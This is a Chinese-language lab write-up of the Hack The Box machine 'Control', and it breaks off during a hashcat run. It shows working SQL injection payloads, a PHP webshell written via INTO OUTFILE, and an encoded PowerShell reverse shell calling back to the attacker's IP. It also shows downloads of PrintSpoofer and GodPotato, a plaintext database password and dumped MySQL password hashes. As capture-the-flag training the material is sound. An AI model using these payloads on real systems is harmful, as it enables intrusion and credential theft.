---
title: HTB-Control Writeup
date: 2026-10-13T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Windows
  - HTB
  - Writeup
  - SQL注入
  - MYSQL
  - BurpSuite
  - PrintSpoofer
  - JuciePotato
  - 代码执行
---
## Nmap 探索

扫描开放的端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ sudo nmap --min-rate 10000 -p- 10.129.54.109 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-12 02:49 -0400
Nmap scan report for 10.129.54.109
Host is up (0.16s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
3306/tcp  open  mysql
49666/tcp open  unknown
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
80,135,3306,49666,49667
```

对开放的端口做详细信息扫描，开放了 80、135、3306 端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ sudo nmap -sT -sC -sV -O -p80,135,3306,49666,49667 10.129.54.109 -oA Nmap/detail
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-12 02:50 -0400
Nmap scan report for 10.129.54.109
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql   MariaDB 10.3.24 or later (unauthorized)
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.62 seconds
```

## Web 渗透

whatweb 识别 Web 技术栈，拿到了 IIS、MariaDB、RPC 端点的信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ whatweb http://10.129.54.109
http://10.129.54.109 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.54.109], JQuery, Microsoft-IIS[10.0], PHP[7.3.7], Script[text/javascript], Title[Fidelity], X-Powered-By[PHP/7.3.7]
```

浏览 web 界面，导航上有 Home、About、Admin。

![](Pasted%20image%2020261012145731.png)

Admin 界面，但是被拒绝了，提示要添加请求头。

![](Pasted%20image%2020261012145958.png)

进行目录爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ sudo feroxbuster -u http://10.129.54.109/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.54.109/
 🚩  In-Scope Url          │ 10.129.54.109
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       89l      238w     3145c http://10.129.54.109/index.php
200      GET       15l       34w      256c http://10.129.54.109/assets/css/noscript.css
200      GET        1l       15w       89c http://10.129.54.109/admin.php
200      GET      587l     1232w    12433c http://10.129.54.109/assets/js/util.js
200      GET      187l      706w     7867c http://10.129.54.109/about.php
200      GET        2l       87w     2439c http://10.129.54.109/assets/js/breakpoints.min.js
200      GET        2l       39w     5106c http://10.129.54.109/assets/js/jquery.dropotron.min.js
200      GET        2l       51w     1851c http://10.129.54.109/assets/js/browser.min.js
200      GET        2l       23w      831c http://10.129.54.109/assets/js/jquery.scrolly.min.js
200      GET       25l       55w      943c http://10.129.54.109/assets/js/functions.js
200      GET      250l      481w     4836c http://10.129.54.109/assets/js/main.js
200      GET        2l       37w     2257c http://10.129.54.109/assets/js/jquery.scrollex.min.js
200      GET     4111l     7901w    73447c http://10.129.54.109/assets/css/main.css
200      GET      369l     1127w   134268c http://10.129.54.109/images/pic01.jpg
200      GET        2l     1276w    88145c http://10.129.54.109/assets/js/jquery.min.js
200      GET       89l      238w     3145c http://10.129.54.109/
403      GET       29l       92w     1233c http://10.129.54.109/assets/css/
403      GET       29l       92w     1233c http://10.129.54.109/assets/
403      GET       29l       92w     1233c http://10.129.54.109/assets/js/
403      GET       29l       92w     1233c http://10.129.54.109/images/
301      GET        2l       10w      151c http://10.129.54.109/Images => http://10.129.54.109/Images/
301      GET        2l       10w      162c http://10.129.54.109/assets/css/Images => http://10.129.54.109/assets/css/Images/
301      GET        2l       10w      151c http://10.129.54.109/assets => http://10.129.54.109/assets/
301      GET        2l       10w      155c http://10.129.54.109/assets/css => http://10.129.54.109/assets/css/
301      GET        2l       10w      151c http://10.129.54.109/images => http://10.129.54.109/images/
301      GET        2l       10w      162c http://10.129.54.109/assets/css/images => http://10.129.54.109/assets/css/images/
301      GET        2l       10w      154c http://10.129.54.109/assets/js => http://10.129.54.109/assets/js/
301      GET        2l       10w      165c http://10.129.54.109/assets/css/Images/ie => http://10.129.54.109/assets/css/Images/ie/
301      GET        2l       10w      152c http://10.129.54.109/uploads => http://10.129.54.109/uploads/
301      GET        2l       10w      165c http://10.129.54.109/assets/css/images/ie => http://10.129.54.109/assets/css/images/ie/
[####################] - 26s    42815/42815   0s      found:30      errors:0
[####################] - 14s     4751/4751    349/s   http://10.129.54.109/
[####################] - 13s     4751/4751    366/s   http://10.129.54.109/assets/css/
[####################] - 13s     4751/4751    366/s   http://10.129.54.109/assets/
[####################] - 13s     4751/4751    366/s   http://10.129.54.109/assets/js/
[####################] - 13s     4751/4751    366/s   http://10.129.54.109/images/
[####################] - 13s     4751/4751    361/s   http://10.129.54.109/Images/
[####################] - 13s     4751/4751    354/s   http://10.129.54.109/assets/css/Images/
[####################] - 13s     4751/4751    372/s   http://10.129.54.109/assets/css/images/
[####################] - 12s     4751/4751    389/s   http://10.129.54.109/uploads/                                                                                                 
```

Mysql 是存活的，返回本机地址和拒绝连接，说明 3306 只对本地开放。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ nmap -p3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-users 10.129.54.109
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-12 03:11 -0400
Nmap scan report for 10.129.54.109
Host is up (0.10s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
|_mysql-empty-password: Host '10.10.16.151' is not allowed to connect to this MariaDB server

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

构造请求头 127.0.0.1，访问被拒绝。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ curl -i -sS -H "X-Forwarded-For: 127.0.0.1" http://10.129.54.109/admin.php

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.7
Date: Mon, 12 Oct 2026 07:20:21 GMT
Content-Length: 89

Access Denied: Header Missing. Please ensure you go through the proxy to access this page                                                                               
```

一次性尝试更多访问头，但是都失败了，可能 ip 不是 127.0.0.1。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ curl -i -sS -H "X-Forwarded-For: 127.0.0.1" -H "Client-IP: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Proxy-IP: 127.0.0.1" -H "Forwarded: for=127.0.0.1" -H "Via: 1.1 localhost" http://10.129.54.109/admin.php
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.7
Date: Mon, 12 Oct 2026 07:23:13 GMT
Content-Length: 89

Access Denied: Header Missing. Please ensure you go through the proxy to access this page                                                                               
```

在 index 界面的源码里发现了一段信息，证书放在 \192.168.4.28\myfiles，这个可能是正确的 IP。

```bash
	<!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
```

burp 构造请求体，加上这个 IP。

```bash
GET /admin.php HTTP/1.1

Host: 10.129.54.109

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://10.129.54.109/index.php

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

X-Forwarded-For: 192.168.4.28




```

可以在设置里为每个请求都加上 `X-Forwarded-For: 192.168.4.28`。

![](Pasted%20image%2020261012155018.png)

可以看到访问成功了。

![](Pasted%20image%2020261012155258.png)

## SQL 注入

在搜索框尝试一下 SQL 注入。

![](Pasted%20image%2020261012160839.png)

出现了报错。

![](Pasted%20image%2020261012161037.png)

尝试注入语句，暴露出了版本名，确认存在注入。

```bash
' UNION SELECT @@version,2,3,4,5,6-- -
```

![](Pasted%20image%2020261012161822.png)

查询文件限制，返回 NULL，说明 MariaDB 不限制路径，可能可以写文件。
- @@securet_file_priv：控制数据库做文件操作，空字符串/未设置 可任意访问路径；某个目录则只能操作该目录下的文件；NULL 属于未设置，同意不限制。
- IFNULL（x,y）：值不是 NULL 就返回原值，是 NULL 就返回替身。
- 0x4e554c4c：NULL 的十六进制。

```bash
' UNION SELECT IFNULL(@@secure_file_priv,0x4e554c4c),2,3,4,5,6-- -
```

![](Pasted%20image%2020261012162005.png)

直接读取网站的根目录，返回 NULL。

```bash
' UNION SELECT IFNULL(LOAD_FILE('C:/xampp/htdocs/index.php'),0x4e554c4c),2,3,4,5,6-- -
```

![](Pasted%20image%2020261012163149.png)

将查询的请求保存为 `req.txt`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ cat req.txt
POST /search_products.php HTTP/1.1
Host: 10.129.54.109
Content-Length: 322
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.129.54.109
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.54.109/admin.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

productName=test
```

用 sqlmap 尝试自动注入，没得到更多有效的信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ sudo sqlmap -r req.txt -p productName --dbms=mysql --technique=UE --union-cols=6 --parse-errors --batch --level=3 --risk=2 --threads=4 --flush-session
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:59:28 /2026-10-12/

[04:59:28] [INFO] parsing HTTP request from 'req.txt'
[04:59:28] [INFO] testing connection to the target URL
[04:59:28] [WARNING] potential permission problems detected ('Access Denied')
[04:59:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:59:29] [WARNING] heuristic (basic) test shows that POST parameter 'productName' might not be injectable
[04:59:29] [INFO] testing for SQL injection on POST parameter 'productName'
[04:59:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:59:32] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:59:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:59:37] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:59:39] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:59:39] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:59:39] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[04:59:40] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[04:59:40] [INFO] testing 'Generic UNION query (NULL) - 6 to 6 columns (custom)'
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[05:00:52] [INFO] testing 'MySQL UNION query (20) - 6 to 6 columns (custom)'
[05:01:59] [WARNING] POST parameter 'productName' does not seem to be injectable
[05:01:59] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[05:01:59] [WARNING] your sqlmap version is outdated

[*] ending @ 05:01:59 /2026-10-12/
```

翻阅源码的时候发现了很多 php 文件。

![](Pasted%20image%2020261012172519.png)

一次性加入多个路径判断是否可以读取。

```bash
' UNION SELECT CONCAT('base=',IFNULL(@@basedir,0x4e554c4c),'|hist1=',IF(LOAD_FILE('C:/inetpub/history/CFGHISTORY_0000000001/applicationHost.config') IS NULL,'NO','YES'),'|hist2=',IF(LOAD_FILE('C:/inetpub/history/CFGHISTORY_0000000002/applicationHost.config') IS NULL,'NO','YES'),'|php_a=',IF(LOAD_FILE('C:/PHP/php.ini') IS NULL,'NO','YES'),'|php_b=',IF(LOAD_FILE('C:/php/php.ini') IS NULL,'NO','YES'),'|php_c=',IF(LOAD_FILE('C:/Windows/php.ini') IS NULL,'NO','YES'),'|php_d=',IF(LOAD_FILE('C:/Program Files/PHP/v7.3/php.ini') IS NULL,'NO','YES'),'|www=',IF(LOAD_FILE('C:/inetpub/wwwroot/index.php') IS NULL,'NO','YES')),2,3,4,5,6-- -
```

![](Pasted%20image%2020261012173438.png)

读取搜索页的源码。

```bash
' UNION SELECT IFNULL(LOAD_FILE('C:/inetpub/wwwroot/search_products.php'),0x4e554c4c),2,3,4,5,6-- -
```

确认 SQL 是直接把参数拼进单引号里。

![](Pasted%20image%2020261012173752.png)

用 INTO OUTFILE 往网站根目录写一个一句话木马，前缀让原查询匹配零行，文件里只有这一行。

```bash
enil' UNION SELECT '<?php system($_REQUEST["c"]);?>','','','','','' INTO OUTFILE 'C:/inetpub/wwwroot/x.php'-- -
```

![](Pasted%20image%2020261012174010.png)

## 代码执行

访问刚写进去的木马，`whoami` 拿到回显，获得一个低权限执行点。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ curl -sS -i --max-time 10 -H 'X-Forwarded-For: 192.168.4.28' 'http://10.129.54.109/x.php?c=whoami'
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.7
Date: Mon, 12 Oct 2026 08:53:59 GMT
Content-Length: 25

nt authority\iusr
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ curl -sS -H 'X-Forwarded-For: 192.168.4.28' 'http://10.129.54.197/x.php' --data-urlencode 'c=powershell -nop -c whoami'
nt authority\iusr
```

用 base64 编码的 Powershell 让机器主动连回 Kali。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ curl -sS --max-time 25 -H 'X-Forwarded-For: 192.168.4.28' --data-urlencode "c=start /b powershell -nop -w hidden -enc $(printf '%s' '$c=New-Object Net.Sockets.TCPClient("10.10.16.151",4444);$s=$c.GetStream();$e=New-Object Text.ASCIIEncoding;$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;while($true){$w.Write("PS "+(Get-Location).Path+"> ");$b=New-Object byte[] 65536;$i=$s.Read($b,0,65536);if($i -le 0){break};$cmd=$e.GetString($b,0,$i).Trim();if($cmd -eq "exit"){break};$r="";try{$r=(iex $cmd 2>&1|Out-String)}catch{$r="ERR: $_"};$w.Write($r)}' | iconv -t UTF-16LE | base64 -w0)" http://10.129.54.197/x.php
```

拿到可执行命令的 shell。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ sudo rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.54.197] 49674
PS C:\inetpub\wwwroot> whoami
nt authority\iusr
```

## 提权至 hector

查看权限发现有 `ImpersonatePrivilege`，可以尝试一下 Potato 提权。

```bash
PS C:\inetpub\wwwroot> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

查看本机监听的端口，只有 5985。

```bash
PS C:\inetpub\wwwroot> netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       812
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1984
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       452
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       68
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       956
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1716
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       584
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       604
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       812
  TCP    [::]:3306              [::]:0                 LISTENING       1984
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       452
  TCP    [::]:49665             [::]:0                 LISTENING       68
  TCP    [::]:49666             [::]:0                 LISTENING       956
  TCP    [::]:49667             [::]:0                 LISTENING       1716
  TCP    [::]:49668             [::]:0                 LISTENING       584
  TCP    [::]:49669             [::]:0                 LISTENING       604

```

查看 web 目录下的文件发现有一个 `database.php`。

```bash
PS C:\inetpub\wwwroot> dir


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/23/2019   5:02 PM                assets                                                                
d-----        11/5/2019   2:42 PM                images                                                                
d-----       11/12/2019  11:49 AM                uploads                                                               
------        11/5/2019   2:42 PM           7867 about.php                                                             
-a----       11/20/2019   1:16 AM           7350 admin.php                                                             
------        11/5/2019   2:42 PM            479 create_category.php                                                   
------        11/5/2019   2:42 PM            585 create_product.php                                                    
------        11/5/2019   2:42 PM            904 database.php                                                          
------        11/5/2019   2:42 PM            423 delete_category.php                                                   
------        11/5/2019   2:42 PM            558 delete_product.php                                                    
-a----       11/19/2019   5:57 PM           3145 index.php                                                             
------        11/5/2019   2:42 PM          17128 LICENSE.txt                                                           
-a----       11/19/2019   6:07 PM           3578 search_products.php                                                   
------        11/5/2019   2:42 PM            498 update_category.php                                                   
------        11/5/2019   2:42 PM           4056 update_product.php                                                    
------        11/5/2019   2:42 PM           2933 view_product.php                                                      
-a----       10/13/2026   4:51 AM             37 x.php
```

查看 `database.php` 发现了 manager 的密码是 `l3tm3!n`。

```bash
PS C:\inetpub\wwwroot> type database.php                                                                                                            
<?php                                                                                                                                               
class Database                                                                                                                                      
{                                                                                                                                                   
    private static $dbName = 'warehouse' ;                                                                                                          
    private static $dbHost = 'localhost' ;                                                                                                          
    private static $dbUsername = 'manager';                                                                                                         
    private static $dbUserPassword = 'l3tm3!n';                                                                                                     

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
       // One connection through whole application
       if ( null == self::$cont )
       {     
        try
        {
          self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword); 
        }
        catch(PDOException $e)
        {
          die($e->getMessage()); 
        }
       }
       return self::$cont;
    }
     
    public static function disconnect()
    {
        self::$cont = null;
    }
}
?>
```

确认系统是 Windows SERVER 2019，内部版本为 17763.805。

```bash
PS C:\inetpub\wwwroot> cmd /c ver

Microsoft Windows [Version 10.0.17763.805]
PS C:\inetpub\wwwroot> [Environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      17763  0       


PS C:\inetpub\wwwroot> Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName,CurrentBuild,UBR

ProductName                  CurrentBuild UBR
-----------                  ------------ ---
Windows Server 2019 Standard 17763        805

```

Spooler 服务在后台运行，可以尝试 PrintSpoofer。

```bash
PS C:\inetpub\wwwroot> Get-Service Spooler | Select-Object Name,Status

Name     Status
----     ------
Spooler Running

```

准备好利用文件。

```bash
┌──(kali㉿kali)-[~/Work/Tools/PrintSpoofer]
└─$ ls -liah
total 36K
2774909 drwxrwxr-x  2 kali kali 4.0K Mar  2  2026 .
2490825 drwxrwxr-x 41 kali kali 4.0K Sep 17 15:22 ..
2774914 -rw-------  1 kali kali  27K Mar  2  2026 PrintSpoofer64.exe
```

开启建议服务器。

```bash
┌──(kali㉿kali)-[~/Work/Tools/PrintSpoofer]
└─$ goshs  -p 80                                                       
WARNING[2026-10-12 22:38:18] Failed to check for updates: GET https://api.github.com/repos/patrickhener/goshs/releases/latest: 403 API rate limit exceeded for 47.129.47.233. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.) [rate reset in 22m44s] 
  __ _  ___  ___| |__  ___ 
 / _` |/ _ \/ __| '_ \/ __|
| (_| | (_) \__ \ | | \__ \
 \__, |\___/|___/_| |_|___/
  __/ |                    
 |___/              v2.0.6

INFO   [2026-10-12 22:38:18] Download embedded file at: /example.txt?embedded 
INFO   [2026-10-12 22:38:18] Serving on interface br-46cc2717038e bound to 172.18.0.1:80 
INFO   [2026-10-12 22:38:18] Serving on interface tun0 bound to 10.10.16.151:80 
INFO   [2026-10-12 22:38:18] Serving on interface lo bound to 127.0.0.1:80 
INFO   [2026-10-12 22:38:18] Serving on interface eth0 bound to 10.10.10.5:80 
INFO   [2026-10-12 22:38:18] Serving on interface docker0 bound to 172.17.0.1:80 
INFO   [2026-10-12 22:38:18] Serving HTTP from /home/kali/Work/Tools/PrintSpoofer 
INFO   [2026-10-12 22:38:44] 10.129.54.197:49680 - [200] - "GET /PrintSpoofer64.exe HTTP/1.1"
```

下载到新建的文件夹下。

```bash
PS C:\Apps> IWR http://10.10.16.151:80/PrintSpoofer64.exe -OutFile C:\Apps\ps.exe -UseBasicParsing
PS C:\Apps> dir


    Directory: C:\Apps


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/13/2026   5:45 AM          27136 ps.exe                                                                
-a----       10/13/2026   5:37 AM             14 test.txt
```

尝试命令执行，失败了。

```bash
PS C:\Apps> C:\Apps\ps.exe -c "cmd /c whoami"  
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.
```

换成 GodPotato 试试。

```bash
PS C:\Apps> IWR http://10.10.16.151:80/GodPotato-NET4.exe -OutFile C:\Apps\gp.exe -UseBasicParsing
PS C:\Apps> dir


    Directory: C:\Apps


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/13/2026   4:51 AM          57344 gp.exe                                                                
-a----       10/13/2026   5:45 AM          27136 ps.exe                                                                
-a----       10/13/2026   5:37 AM             14 test.txt 
```

同样失败了。

```bash
PS C:\Apps> C:\Apps\gp.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140736015302656
[*] DispatchTable: 0x140736017612000
[*] UseProtseqFunction: 0x140736016991328
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\f128ae55-46a9-4313-aee1-b89353f19e5a\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000c802-0424-ffff-b671-d8c82540f19e
[*] DCOM obj OXID: 0xc24d822d9ce64c3d
[*] DCOM obj OID: 0xc09476c7e9ad440f
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070776
[!] Failed to impersonate security context token

```

回到 SQL 查询，查询数据库，manager 只有 FILE、warehouse 库的全部权限加上 mysql 库的读权限。

```bash
PS C:\Apps> & "C:\Program Files\MariaDB 10.4\bin\mysql.exe" -u manager -pl3tm3!n -t --connect-timeout=5 -e "select user(),current_user(); show grants;"
+-------------------+-------------------+
| user()            | current_user()    |
+-------------------+-------------------+
| manager@localhost | manager@localhost |
+-------------------+-------------------+
+---------------------------------------------------------------------------------------------------------------+
| Grants for manager@localhost                                                                                  |
+---------------------------------------------------------------------------------------------------------------+
| GRANT FILE ON *.* TO 'manager'@'localhost' IDENTIFIED BY PASSWORD '*CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA' |
| GRANT SELECT ON `mysql`.* TO 'manager'@'localhost'                                                            |
| GRANT ALL PRIVILEGES ON `warehouse`.* TO 'manager'@'localhost'                                                |
+---------------------------------------------------------------------------------------------------------------+

```

列出全部数据库。

```bash
PS C:\Apps> & "C:\Program Files\MariaDB 10.4\bin\mysql.exe" -u manager -pl3tm3!n -t --connect-timeout=5 -e "show databases;"
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| warehouse          |
+--------------------+

```

读取帐号表，发现 hector 的 hash。

```bash
PS C:\Apps> & "C:\Program Files\MariaDB 10.4\bin\mysql.exe" -u manager -pl3tm3!n -t --connect-timeout=5 -e "select user,host,plugin,password,authentication_string from mysql.user;"
+---------+-----------+-----------------------+-------------------------------------------+-------------------------------------------+
| User    | Host      | plugin                | Password                                  | authentication_string                     |
+---------+-----------+-----------------------+-------------------------------------------+-------------------------------------------+
| root    | localhost | mysql_native_password | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
| root    | fidelity  | mysql_native_password | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
| root    | 127.0.0.1 | mysql_native_password | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
| root    | ::1       | mysql_native_password | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
| manager | localhost | mysql_native_password | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA |
| hector  | localhost | mysql_native_password | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D |
+---------+-----------+-----------------------+-------------------------------------------+-------------------------------------------+

```

保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ cat h.hash
0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
```

破解得到 hector 的密码是 `l33th4x0rhector`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ hashcat -m 300 -a 0 h.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt

